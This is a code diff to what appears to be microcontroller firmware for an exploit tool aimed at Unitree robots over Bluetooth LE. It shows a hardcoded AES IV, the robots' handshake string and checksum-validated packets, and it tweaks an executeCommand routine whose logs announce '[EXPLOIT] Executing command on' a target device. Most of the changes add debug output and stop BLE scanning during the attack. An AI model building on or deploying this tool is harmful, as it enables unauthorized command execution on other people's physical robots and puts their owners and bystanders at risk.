@@ -49,7 +49,7 @@ const uint8_t AES_IV[16] = {
     0x29, 0x6a, 0x0d, 0x4b, 0xdf, 0xe1, 0x9a, 0x4f
 };
 
-const String HANDSHAKE_CONTENT = "unitree";
+const String HANDSHAKE_CONTENT = "unitree"; // Standard handshake content for real Unitree robots
 const String COUNTRY_CODE = "US";
 
 // External declarations for web interface variables
@@ -359,17 +359,17 @@ std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t
 
 bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
     if (response.size() < 5) {
-        errorPrint("Response packet too short");
+        errorPrint("Response packet too short: " + String(response.size()));
         return false;
     }
     
     if (response[0] != 0x51) {
-        errorPrint("Invalid opcode in response");
+        errorPrint("Invalid opcode in response: 0x" + String(response[0], HEX));
         return false;
     }
     
     if (response.size() != response[1]) {
-        errorPrint("Packet length mismatch");
+        errorPrint("Packet length mismatch: Expected " + String(response[1]) + ", Got " + String(response.size()));
         return false;
     }
     
@@ -387,10 +387,13 @@ bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expe
     expectedChecksum = (~expectedChecksum + 1) & 0xFF;
     
     if (response[response.size() - 1] != expectedChecksum) {
-        errorPrint("Checksum validation failed");
+        errorPrint("Checksum validation failed: Expected 0x" + String(expectedChecksum, HEX) + 
+                   ", Got 0x" + String(response[response.size() - 1], HEX));
         return false;
     }
     
+    // Debug the final check
+    styledPrint("[DEBUG] Final validation check: response[3]=0x" + String(response[3], HEX) + " (expecting 0x01)", true);
     return response[3] == 0x01;
 }
 
@@ -782,6 +785,13 @@ void addRecentDevice(const UnitreeDevice& device) {
 
 bool executeCommand(const UnitreeDevice& device, const String& command) {
     Serial.println("[EXPLOIT] Executing command on " + device.address + ": " + command);
+    
+    // Stop continuous scanning to prevent BLE interference during exploit
+    if (continuousScanning) {
+        Serial.println("[EXPLOIT] Stopping BLE scan to prevent interference...");
+        stopContinuousScanning();
+        delay(500); // Give BLE stack time to clean up
+    }
     
     if (!connectToDevice(device)) {
         Serial.println("[EXPLOIT] Failed to connect to device");
